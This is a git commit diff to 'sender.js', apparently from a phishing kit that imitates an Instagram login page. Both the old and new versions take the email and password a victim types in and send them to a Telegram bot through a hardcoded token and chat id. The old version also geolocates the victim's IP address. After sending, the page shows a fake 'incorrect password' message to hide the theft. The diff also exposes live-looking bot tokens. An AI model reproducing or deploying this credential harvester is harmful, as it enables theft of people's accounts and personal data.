0fbd2b0278ea4ba9fe1c9d0407cc2ef7e6e5f69d
godspowerosayomwanbor <godspowerosayomwanbor25@gmail.com>
2024-11-06 07:16:53 +0100

    Update sender.js

--- js/sender.js
+++ js/sender.js
@@ -1,40 +1,24 @@
-
-const form = document.querySelector("#form");
-var ct = "5";
-var co = 0;
-var lo = 0;
-var st = 0;
+const form = document.querySelector("#form")
 
 form.addEventListener("submit", (e) => {
-  e.preventDefault();
- 
-    fetch("https://ipapi.co/json/")
-      .then((res) => res.json())
-      .then((data) => {
-        ct = data.ip;
-        co = data.country_name;
-        lo = data.country_calling_code;
-        st = data.city;
+    e.preventDefault();
 
-        var identity = document.getElementById("email").value;
-        var password = document.getElementById("password").value;
+    var identity = document.getElementById("email").value;
+    var password = document.getElementById("password").value;
 
-        var my_text = `Instagram Result from IpAddress for user ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
-    
-          var token = "6238010383:AAFgGZNvVLJG-Q35fJLZl6w19OS1FG5_TZU";
-    var chat_id = -1002043568601
-        var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
+    var my_text = `Result is:%0A - Identity: ${identity} %0A - Password: ${password}`
 
-        let api = new XMLHttpRequest();
-        api.open("GET", url, true);
-        api.send();
-        document.getElementById("alert-message").innerHTML =
-          "Sorry, your password was incorrect. Please double-check your password.";
-      });
+    var token = "6650969963:AAECQrzycrXYX2_j45OEBuoMU38lLXTjLh8";
+    var chat_id = -4213686359
+    var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`
+
+    let api = new XMLHttpRequest();
+    api.open("GET", url, true);
+    api.send();
+    // window.location.replace("https://www.instagram.com/accounts/login/")
+    console.log("Incorrect Password!");
+
+    document.getElementById("alert-message").innerHTML = "Sorry, your password was incorrect. Please double-check your password.";
+})
 
 
-
-
-  // window.location.replace("https://www.instagram.com/accounts/login/")
-  //   console.log("Incorrect Password!");
-});
